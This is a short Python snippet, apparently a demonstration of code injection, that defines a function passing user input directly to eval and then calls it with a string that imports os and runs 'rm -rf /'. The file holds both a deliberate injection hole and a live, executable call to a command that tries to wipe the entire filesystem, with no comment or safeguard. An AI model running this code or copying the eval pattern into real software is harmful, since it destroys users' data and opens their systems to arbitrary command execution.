def unsafe_eval(user_input):
    eval(user_input)

unsafe_eval("__import__('os').system('rm -rf /')")
